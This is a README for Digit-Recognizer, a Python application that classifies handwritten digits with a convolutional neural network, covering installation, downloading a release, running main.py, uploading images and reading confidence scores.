## 📝 Description
Digit-Recognizer is a software application designed to classify handwritten digits. Built from scratch, this tool serves as an excellent resource for learning and experimentation in machine learning. It utilizes deep learning techniques to accurately identify digits from images, providing a practical example of convolutional neural networks in action.

## 🚀 Getting Started
To start using Digit-Recognizer, follow these steps:

1. **Requirements**
   - Operating System: Windows, macOS, or Linux.
   - Python 3.6 or higher. If you do not have Python, please download it from [python.org](https://www.python.org/downloads/).
   - NumPy and SciPy libraries. These can usually be installed using:
     ```
     pip install numpy scipy
     ```

2. **Download the Application**
   - To get the latest version of Digit-Recognizer, visit this page to download: [Release Page](https://github.com/XxXgamez/Digit-Recognizer/releases).

## 💡 Usage Instructions
After downloading, follow these steps to run the application:

1. **Extract the Files**
   - If you downloaded a ZIP file, right-click on it and select "Extract All." Choose your preferred location for the files.

2. **Navigate to the Directory**
   - Open your command line or terminal.
   - Use the `cd` command to change to the directory where you extracted the files.
     ```
     cd path/to/digit-recognizer-folder
     ```

3. **Run the Application**
   - To start the classification process, enter the following command:
     ```
     python main.py
     ```
   - This will open the application interface. Follow the prompts to upload an image of a handwritten digit.

## 📸 Uploading an Image
- Click on the designated upload button to choose an image file from your computer.
- Supported image formats include PNG, JPG, and BMP. Make sure the image is clear and the digits are easily readable for the best results.

## 🔍 Understanding Results
Once you upload an image, the application will process it and display the predicted digit. You will see:
- The classified digit on the screen.
- Confidence levels indicating how likely the application believes the identified digit is correct.

## 📊 Features
- Classify handwritten digits with high accuracy.
- User-friendly interface designed for easy navigation.
- Supports multiple image formats for input.
- Detailed confidence scoring for results.

## ⚙️ Advanced Options (Optional)
For users interested in exploring more features:
- Modify parameters in the `config.py` file for different model settings.
- Experiment with additional data for training and testing right within the application.
